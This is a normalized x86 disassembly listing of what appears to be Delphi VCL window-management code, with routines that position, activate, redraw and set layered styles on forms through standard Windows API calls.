jge r-xdata
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_47f61c
cmp ebx eax
jge r-xdata
adc esi 0x0
add ebx eax
mov eax esi
call sub_479188
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_47f610
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_47f610
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_47f61c
mov ebx eax
mov eax [ rw-data ]
call sub_47f610
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_47f61c
mov ebx eax
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
sub esi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ rw-data ]
call sub_47f610
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_47f610
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_47afd4
jmp r-xdata
sub_47db9c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_482674
call sub_448cfc
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47c3d4
mov eax [ ebp - 0x4 ]
test [ eax + 0x374 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_496868
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dccc
mov eax [ ebp - 0x4 ]
and [ eax + 0x374 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
call sub_4769b0
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
call sub_476cdc
mov ebx eax
sub_47dd18
push ebx
mov ebx eax
mov eax ebx
call sub_497d48
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x36c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x36c ]
push eax
call SendMessageW
sub_47dd74
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
call sub_48e09c
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_47ddac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffa4
call sub_4483f8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47dde4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x374 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
test al al
je r-xdata
mov [ ebx + 0x2a4 ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x280 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4825dc
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffad
call sub_4483f8
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_47df84
jmp r-xdata
mov eax ebx
call sub_47e060
mov dl 0x1
mov eax ebx
call sub_47af94
jmp r-xdata
sub_47de88
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x287 ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x2ea ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_47a71c
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_47a768
mov edx [ eax ]
call [ edx + 0xf8 ]
test al al
je r-xdata
sub_47deec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4488a4#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
test al al
je r-xdata
movzx eax [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4483f8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2a4 ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47e060
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47dfa4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47e023
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x286 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e02a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov eax ebx
call sub_496c14
test al al
jne r-xdata
mov eax ebx
call sub_47c2a8
sub_47e030
push ebx
mov ebx eax
mov [ ebx + 0x34c ] edx
xor eax eax
mov [ ebx + 0x348 ] eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_4930c8
pop ebx
retn
mov eax ebx
call sub_492ec4
pop ebx
retn
sub_47e07c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47e36e
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_48c3b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_480e40
xor edx edx
push ebp
push sub_47e351
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x374 ] 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x338 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
test [ eax + 0x374 ] 0x8
jne r-xdata
call GetActiveWindow
mov [ ebp - 0x1c ] eax
call sub_4769d4
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x70 ]
mov eax [ rw-data ]
mov eax [ eax + 0x74 ]
xor edx edx
call sub_424768
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x70 ] edx
mov eax [ rw-data ]
movzx eax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_47fbf8
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_476b80
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_47e32f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_47df8c
xor edx edx
push ebp
push sub_47e28e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2a4 ] edx
mov eax [ rw-data ]
cmp [ eax + 0xcc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a4 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_492ec4
mov eax [ ebp - 0x4 ]
call sub_496844
call GetCapture
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47deec
mov eax [ rw-data ]
call sub_482250
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
call sub_496868
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e295
mov eax [ ebp - 0x4 ]
call sub_47df84
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_47e295
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e339
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_47fbf8
movzx edx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_47fbf8
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x70 ] edx
mov eax ebx
call sub_4246e0
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x70 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x74 ]
call sub_4248a0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_476c44
mov eax [ rw-data ]
mov ebx [ eax + 0x74 ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
call sub_4769dc
mov eax [ ebp - 0x4 ]
and [ eax + 0x374 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_47e380
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
cmp [ edi + 0x1e2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax edi
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
call sub_492534
test eax eax
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4924f8
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47e380
pop ecx
sub_47e404
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov esi [ ebx + 0x2a0 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_47e380
pop ecx
mov eax [ esi + 0x34 ]
call sub_466084
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x2a0 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_466094
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_47e46c
push ebx
add esp 0xffffffd4
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
add esp 0x2c
pop ebx
retn
mov [ esp ] 0x2c
push esp
mov eax ebx
call sub_496868
push eax
call GetWindowPlacement
mov eax [ esp + 0x8 ]
sub eax 0x2
je r-xdata
mov [ ebx + 0x283 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov [ ebx + 0x283 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x283 ] 0x0
sub_47e4e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_494754
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
sub_47e500
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4483f8
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_47e530
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47e500
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_492534
test eax eax
jle r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47e530
pop ecx
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47e5b8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x278 ]
call sub_47e500
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_47e500
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_47e530
pop ecx
test al al
je r-xdata
sub_47e60c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4483f8
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_47e63c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
cmp [ edi + 0x1e2 ] 0x0
je r-xdata
xor eax eax
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax edi
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47e60c
pop ecx
test al al
jne r-xdata
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
call sub_492534
test eax eax
jle r-xdata
mov al 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47e63c
pop ecx
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47e6cc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x278 ]
call sub_47e60c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_47e60c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_47e63c
pop ecx
test al al
je r-xdata
sub_47e720
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_42e8d0
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
xor edi edi
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47e720
pop ecx
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_451230
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_42e8a4
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_47e79c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
cmp [ ebx + 0x312 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
mov al 0x1
mov edi [ ebx + 0x2a0 ]
test edi edi
je r-xdata
push ebp
mov eax ebx
call sub_47e720
pop ecx
test al al
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffee
call sub_4483f8
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47e814
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_42ea1c
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x2a8 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_47e850
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_48e528
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_48f2b0
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47e898
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
mov esi eax
cmp [ ebx + 0x330 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x358 ] 0x0
je r-xdata
movzx eax [ ebx + 0x330 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x358 ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebx + 0x331 ]
push eax
mov eax [ ebx + 0x35c ]
push eax
mov eax ebx
call sub_496868
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call RedrawWindow
sub_47e9ac
push ebx
mov ebx eax
cmp dl [ ebx + 0x358 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x358 ] dl
cmp [ ebx + 0x358 ] 0x0
je r-xdata
mov eax ebx
call sub_47e898
mov eax [ ebx + 0x364 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x364 ]
call sub_4840e0
sub_47ea14
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_48d590
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff
shl edx 0x10
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x288 ] 0x3
je r-xdata
xor edx edx
call sub_47adc4
retn
sub_47ea50
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_48d5c4
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff0000
and edx 0xffff
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x288 ] 0x3
je r-xdata
xor edx edx
call sub_47adc4
retn
sub_47ea9c
push ebx
add esp 0xfffffff0
mov ebx eax
call sub_41f780
test al al
je r-xdata
movzx eax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
add esp 0x10
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_496868
push eax
call InvalidateRect
mov eax [ ebx + 0x364 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
movzx eax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov eax esp
xor ecx ecx
mov edx 0x10
call sub_447ae4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax ebx
call sub_496868
mov edx esp
call sub_41f608
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
push 0xffffffff
push 0x0
mov eax ebx
call sub_496868
push eax
call InvalidateRect
jmp r-xdata
mov [ esp ] 0xffffffff
mov [ esp + 0x4 ] 0xffffffff
mov [ esp + 0x8 ] 0xffffffff
mov [ esp + 0xc ] 0xffffffff
mov edx [ eax + 0xc ]
mov [ esp ] edx
mov edx [ eax + 0x14 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x10 ]
mov [ esp + 0x8 ] edx
mov eax [ eax + 0x18 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub_47eba8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x364 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_490c98
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_490c98
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov al 0x1
jmp r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
test al al
je r-xdata
test [ ebx + 0x55 ] 0x80
je r-xdata
test [ ebx + 0x55 ] 0x80
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
movzx eax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebp - 0xc ]
jl r-xdata
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47eba8
pop ecx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x364 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
sub_47ecf0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
push ebp
mov eax [ ebp - 0x4 ]
call sub_47eba8
pop ecx
sub_47ed14
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
xor edx edx
mov eax ebx
call sub_477ec4
mov dl 0x5
mov eax ebx
call sub_47a4ac
mov dl 0x1
mov eax ebx
call sub_495250
mov dl 0x3
mov eax ebx
call sub_47a8cc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
